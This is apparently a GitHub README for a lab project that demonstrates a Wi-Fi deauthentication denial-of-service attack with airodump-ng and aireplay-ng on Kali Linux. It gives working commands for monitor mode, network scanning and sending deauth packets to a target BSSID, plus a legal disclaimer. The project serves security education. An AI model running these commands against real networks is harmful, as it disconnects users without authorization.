# WiFi-DoS-Attack-Cybersecurity-Education  
*A Kali Linux project using `airodump-ng` and `aireplay-ng` to simulate a Wi-Fi deauthentication (DoS) attack in a secure lab environment for cybersecurity education.*

### [YouTube Demonstration🎥](https://youtu.be/W_J2TSroKSA?si=SB779y5ZXOHBHsrQ)

---

## 📘 Description  
This project demonstrates how wireless networks can be scanned and disrupted using `airodump-ng` and `aireplay-ng`—tools included in Kali Linux. Performed inside a **virtual machine** for safety, this simulation is strictly for educational use to help learners understand how Wi-Fi attacks work and how to defend against them.

---

## 🎯 Main Goal  
To raise awareness about Wi-Fi network vulnerabilities by showing how attackers can use tools to disconnect users from a wireless network through deauthentication attacks. The goal is to promote defensive strategies and responsible cybersecurity practices.

---

## 💼 Tools Used  
- **Virtual Machine**: UTM (version 3.2.4)  
- **Operating System**: Kali Linux  
- **Wi-Fi Tools**:  
  - `airodump-ng`: For scanning nearby wireless networks  
  - `aireplay-ng`: For sending deauthentication packets (DoS simulation)  
- **Wi-Fi Adapter**: USB adapter with monitor mode support

---

## 🖥️ Environment  
- **Host OS**: macOS  
- **Guest OS**: Kali Linux (in UTM virtual machine)  
- **Hardware**: External USB Wi-Fi adapter (monitor mode enabled)

---

## 🦺 Step-by-Step Walkthrough  

### ✅ Step 1: Set Up Kali Linux in Virtual Machine  
- Installed Kali Linux inside UTM on macOS  
- Connected external USB Wi-Fi adapter to Kali VM  

### ✅ Step 2: Enable Monitor Mode  
Run the following commands in the Kali terminal:
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### ✅ Step 3: Scan Wi-Fi Networks  
Start scanning for nearby networks using:
```bash
sudo airodump-ng wlan0
```
- You’ll see BSSID, channel, signal strength, and more.  
- Choose **your own network** for the demonstration.

<img src="https://imgur.com/hdC77iR.png" height="80%" width="80%" alt="Scanning"/>

<br />
<br />

### ✅ Step 4: Launch Deauthentication Attack  
Disconnect clients from your test network (DoS simulation):
```bash
sudo aireplay-ng --deauth 50 -a [Target_BSSID] wlan0
```
- Replace `[Target_BSSID]` with your network's BSSID  
- Sends 50 deauthentication packets to disconnect connected devices  

<img src="https://imgur.com/MAYFtk7.png" height="80%" width="80%" alt="Attack Time"/>
<br />
<br />

### ✅ Step 5: Stop and Reset Adapter  
Stop the attack with `Ctrl + C`. Restore adapter mode:
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```

---

## 📌 Project Summary  
This project shows how wireless networks can be temporarily disrupted using basic tools in Kali Linux. It helps learners understand common Wi-Fi attack techniques and underscores the importance of securing wireless networks against unauthorized access or disruptions.

---

## ⚠️ Disclaimer  
- This project is for **educational and ethical hacking training only**.  
- All demonstrations were conducted on **authorized private networks** in a **virtual lab environment**.  
- **Never use these tools** on public or unauthorized networks.  
- Unauthorized network attacks are **illegal and unethical**.  
- Always follow **local laws** and **cybersecurity best practices**.
